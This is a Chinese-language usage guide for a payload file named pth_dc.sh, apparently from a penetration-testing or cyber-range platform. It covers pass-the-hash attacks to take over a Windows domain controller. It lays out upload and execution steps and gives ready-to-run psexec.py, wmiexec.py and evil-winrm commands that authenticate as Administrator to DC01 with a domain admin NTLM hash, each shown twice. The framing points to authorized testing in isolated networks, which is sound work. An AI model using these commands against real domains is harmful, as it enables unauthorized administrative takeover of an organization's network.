## 📦 载荷使用说明：pth_dc.sh

该载荷文件主要配合 **PTH 拿域控** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `PTH 拿域控` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
python3 psexec.py -hashes :DOMAIN_ADMIN_HASH \\
  corp/Administrator@DC01
```

**配置示例 2**：
```bash
python3 wmiexec.py -hashes :DOMAIN_ADMIN_HASH \\
  corp/Administrator@DC01
```

**配置示例 3**：
```bash
evil-winrm -i DC01 -u Administrator \\
  -H DOMAIN_ADMIN_HASH
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## PTH 拿域控

### 使用 psexec
```bash
python3 psexec.py -hashes :DOMAIN_ADMIN_HASH \\
  corp/Administrator@DC01
```

### 使用 wmiexec
```bash
python3 wmiexec.py -hashes :DOMAIN_ADMIN_HASH \\
  corp/Administrator@DC01
```

### 使用 Evil-WinRM
```bash
evil-winrm -i DC01 -u Administrator \\
  -H DOMAIN_ADMIN_HASH
```

- 需要域管 NTLM Hash
- ✓ 无需明文密码
- 多种工具可选，增加成功率